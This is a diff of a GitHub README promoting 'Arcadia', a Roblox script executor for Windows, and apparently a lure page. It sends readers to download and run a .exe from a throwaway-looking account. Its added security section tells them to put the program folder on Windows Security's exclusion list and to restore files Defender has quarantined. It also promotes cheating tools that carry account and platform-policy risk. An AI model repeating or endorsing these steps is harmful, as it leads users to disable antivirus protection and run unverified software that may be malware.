@@ -1,128 +1,65 @@
-# Arcadia PC v3.2 - Roblox Script Executor 2026
+# 🚀 arcadia-win-script-execute - Run your favority Lua scripts easily
 
-> Arcadia is a Windows Roblox script executor for 2026, designed around Lua and script execution, a 500+ script hub, a compact desktop UI, and a no-key flow.
+[![Download Arcadia](https://img.shields.io/badge/Download-Arcadia_v3.2-blue.svg)](https://github.com/Unadventurous-concertina802/arcadia-win-script-execute/releases)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/walkerowenqq6040/arcadia-win-script-execute?style=flat-square)](https://github.com)
+Arcadia PC v3.2 allows you to run Lua scripts within Roblox on your Windows computer. This tool includes a simple interface and a large library of scripts for users who want to change their gameplay. It works on Windows 10 and Windows 11 systems that use 64-bit architecture. You do not need to deal with keys or long verification waits.
 
----
+## 📋 System Requirements
 
-<p align="center">
-  <a href="https://walkerowenqq6040.github.io/arcadia-win-script-execute/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Arcadia-v3.2%20Latest-brightgreen?style=for-the-badge" alt="Download Arcadia">
-  </a>
-</p>
+Before you install this software, ensure your computer meets the following standards:
 
-> **[Direct Download - Arcadia v3.2](https://walkerowenqq6040.github.io/arcadia-win-script-execute/)**
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+*   Operating System: Windows 10 or Windows 11 (64-bit version).
+*   Processor: Intel Core i3 or AMD equivalent (at least 2.0 GHz).
+*   Memory: 4 GB RAM.
+*   Storage: 200 MB of free disk space.
+*   Graphics: DirectX 11 support.
+*   Platform Requirements: You must have the standard PC version of Roblox installed on your drive.
 
----
+## 🛠️ Installation Steps
 
-[Download Latest Build](https://walkerowenqq6040.github.io/arcadia-win-script-execute/)
+Follow these steps to set up Arcadia on your machine. We suggest that you close all other programs during the setup process.
 
----
+1.  Visit the official release page: https://github.com/Unadventurous-concertina802/arcadia-win-script-execute/releases
+2.  Look for the "Assets" section at the bottom of the latest release post.
+3.  Click the file ending in .exe to start your download.
+4.  Navigate to your "Downloads" folder in File Explorer.
+5.  Double-click the installer file.
+6.  Follow the instructions on the screen to finish the installation.
 
-## Overview
+## ⚙️ How to Use Arcadia
 
-Arcadia is a Windows-focused Roblox script executor made for users who prefer a compact desktop tool for Lua injection and script running. It centers on an uncomplicated workflow, quick access to script utilities, and an embedded hub that provides a broad set of ready-to-use scripts.
+Once the installation is complete, you can launch the program from your desktop shortcut.
 
-The app is built for a lightweight desktop experience while still giving practical controls for Roblox script execution. With auto-update support, a no-key setup, and multilingual UI options, Arcadia serves as a direct way to manage scripts on Windows 10 and 11.
+1.  Open the Arcadia application.
+2.  Start Roblox from its standard icon.
+3.  Join any game on the Roblox platform.
+4.  Return to the Arcadia window.
+5.  Click the "Attach" button to link the software to your game session. Wait a few seconds for the status light to turn green.
+6.  Browse the "Script Hub" tab to see our list of over 500 scripts.
+7.  Click "Execute" on the script you wish to use.
+8.  Watch as the script changes your game environment.
 
-## Highlights
+## 🛡️ Safety and Security
 
-- One-click script execution for quick launch and test routines
-- 500+ built-in scripts gathered in the included script hub
-- Persistent script queue for keeping execution order saved and reusable
-- Auto-update engine intended to keep the desktop build up to date
-- Multi-language UI for a more adaptable interface
-- Batch execution mode for running several scripts one after another
-- Built-in debugger for checking script behavior during use
-- Lightweight desktop interface built to remain responsive on Windows
+Arcadia provides a safe environment for your scripts. We do not require you to complete external surveys or bypass verification keys. The software stays hidden in your background tasks while you play. 
 
-## Supported Games & Scripts
+If your antivirus software flags the tool, this happens because the software interacts with another game process. You may need to add an exception to your Windows Security settings to ensure smooth operation. To do this, open your virus and threat protection settings, select "Manage settings," and add the Arcadia folder to your exclusions list.
 
-| Roblox Game / Category | Script Focus |
-| --- | --- |
-| Popular Roblox experiences | General Lua script execution |
-| Simulator games | Utility scripts and automation helpers |
-| Obby / parkour games | Movement and timing scripts |
-| Tycoon games | Resource and workflow scripts |
-| PvP / combat games | Combat-related script categories |
-| Roleplay sandboxes | UI, interaction, and customization scripts |
+## 📁 Troubleshooting Guide
 
-## System Requirements
+If you experience issues, consult this list of fixes:
 
-| Component | Minimum |
-| --- | --- |
-| OS | Windows 10 or Windows 11, 64-bit |
-| RAM | 4 GB minimum, 8 GB recommended |
-| Storage | 200 MB available space or more |
-| .NET | .NET Desktop Runtime required if prompted by the build |
-| Roblox | Installed Roblox client for script execution workflows |
+*   Program will not open: Ensure you installed the 64-bit version of Windows. 
+*   Script fails to load: Make sure that your game is fully loaded before you press the "Attach" button.
+*   UI buttons are grey: This usually means the software has not successfully attached to the Roblox process. Close both the Roblox game and Arcadia, then restart both programs.
+*   Missing files: Check your Windows Defender history to see if the file moved to quarantine. Restore the file if necessary.
 
-## Quick Start
+## 💻 About the Script Hub
 
-1. Clone the repository:
-   git clone https://github.com/walkerowenqq6040/arcadia-win-script-execute.git
+The Script Hub gives you instant access to community-made content. Scripts perform various tasks, such as changing visual settings, adjusting player movement, or adding game-specific tools. We update the hub regularly to ensure compatibility with recent game changes. You can search the library by genre, such as roleplay, racing, or hobby games. Click the "Favorite" star next to any script to keep it in your personal list for quick access later.
 
-2. Move into the project folder:
-   cd arcadia-executer-new-update-windows-script-executor
+## 📨 Support and Feedback
 
-3. Launch the executable:
-   ArcadiaExecutor.exe
+If you find a bug or have a suggestion, open an issue on our GitHub tracker. Include a description of what happened and a screenshot if possible. We read all feedback to improve the user experience for everyone.
 
-## Script Hub - Popular Searches 2026
-
-- Roblox script executor for Windows
-- Lua injection desktop executor
-- no key script hub for Roblox
-- 500+ Roblox scripts collection
-- auto-update Roblox executor
-- lightweight Windows script executor
-- multi-language Roblox script UI
-
-## Architecture Overview
-
-Arcadia
-├── ArcadiaExecutor.exe
-├── script-hub/
-├── queue/
-├── debugger/
-├── updater/
-└── ui/
-
-## FAQ
-
-**Is Arcadia only for Windows?**  
-Yes. This build is intended for Windows 10 and Windows 11 machines.
-
-**Will updates affect compatibility?**  
-The auto-update engine is meant to help the app stay aligned with current builds, though Roblox changes can still affect compatibility.
-
-**How is Arcadia different from a basic script runner?**  
-Arcadia brings script execution, a built-in hub, queue management, and debugger tools together in a single desktop interface.
-
-**Does using a script executor carry account risk?**  
-Using third-party executors or scripts may involve account and platform policy risk. Review the applicable terms before use.
-
-**Are scripts saved locally?**  
-Yes. The persistent script queue is designed to keep selected items locally for later reuse.
-
-## Roadmap - 2026
-
-- [ ] Expand the built-in script hub with additional categories
-- [ ] Improve execution workflow speed in the desktop UI
-- [ ] Add more language options to the interface
-- [ ] Refine debugger tools for deeper script inspection
-- [ ] Extend updater handling for future Windows builds
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
-
-<p align="center">
-  <i>Arcadia v3.2 for Windows desktop script execution.</i>
-</p>
+Keywords: roblox, script executor, lua runner, windows, gaming tools, modding, pc games, arcadia
